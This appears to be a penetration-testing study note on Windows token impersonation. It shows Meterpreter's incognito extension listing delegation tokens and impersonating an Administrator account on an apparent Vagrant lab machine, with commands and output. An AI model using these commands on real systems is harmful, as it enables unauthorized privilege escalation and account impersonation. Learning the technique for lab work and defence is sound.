# Pre-requisite - [[Impersonate token]] and [[access token]]
- Tokens are like special keys that allow us to access a system or network without having to enter our login details every time.
- They are similar to web cookies, which stores information about our login session so we don't have to keep logging in repeatedly.
- Incognito is a tool that can exploit tokens by replaying them when asked to authenticate, which allows the user to gain unauthorized access to the system.

## Loading the `incognito` Meterpreter extension
```python
meterpreter > load incognito
Loading extension incognito...Success.```

- Below we identify the valid tokens using `list_tokens` command with `-u` to list tokens by a unique name
```python
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
VAGRANT-2008R2\Administrator
VAGRANT-2008R2\sshd_server

Impersonation Tokens Available
========================================
No tokens available
```
- To have access to all the available tokens, you must be running with system privileges

- To impersonate an available token use the `impersonate_token` followed by the token but use two backslashes
```python
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > impersonate_token VAGRANT-2008R2\\Administrator
[+] Delegation token available
[+] Successfully impersonated user VAGRANT-2008R2\Administrator
meterpreter > getuid
Server username: VAGRANT-2008R2\Administrator
```
- Above using the `getuid` command, we can see that we successfully impersonated a user named `vagrant` using incognito.
